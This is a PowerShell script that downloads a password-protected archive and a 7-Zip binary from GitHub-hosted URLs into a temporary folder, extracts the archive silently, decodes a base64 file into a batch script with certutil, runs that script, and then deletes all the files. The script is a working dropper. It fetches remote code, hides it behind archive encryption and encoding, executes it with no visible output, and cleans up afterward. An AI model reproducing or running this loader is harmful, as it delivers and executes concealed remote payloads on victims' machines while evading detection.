# Enable TLSv1.2 for compatibility with older clients
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12

$DateVar = Get-Date -Format 'yyyyMMddHHmmss'
$DownloadR = 'https://github.com/ClaususOrbis/haste/releases/download/waste/release?v=' + $DateVar
$Download7z = 'https://claususorbis.github.io/haste/7za.exe'

if (Test-Path -Path "$env:TEMP\SURNQQ") {
	Remove-Item -Path "$env:TEMP\SURNQQ" -Recurse -Force *>$null
}
New-Item -Path "$env:TEMP\SURNQQ" -ItemType Directory *>$null

$FilePathR = "$env:TEMP\SURNQQ\release.7z"
$FilePath7z = "$env:TEMP\SURNQQ\7za.exe"
$FilePathB = "$env:TEMP\SURNQQ\0.b64"
$FilePathBat = "$env:TEMP\SURNQQ\0.bat"

try {
    Invoke-WebRequest -Uri $DownloadR -UseBasicParsing -OutFile $FilePathR
	Invoke-WebRequest -Uri $Download7z -UseBasicParsing -OutFile $FilePath7z
} catch {
    Write-Error $_
	Return
}

try {
    & $FilePath7z e -paqSWdeFR $FilePathR -o"$env:TEMP\SURNQQ\" *>$null
} catch {
    Write-Error $_
	Return
}

try {
	certutil -decode $FilePathB $FilePathBat *>$null
} catch {
	Write-Error $_
	Return
}

if (Test-Path $FilePathBat) {
    Start-Process $FilePathBat -Wait
    # $item = Get-Item -LiteralPath $FilePathBAT
    # $item.Delete()
	Start-Sleep -Seconds 2
	Remove-Item -Path "$env:TEMP\SURNQQ" -Recurse -Force *>$null
}
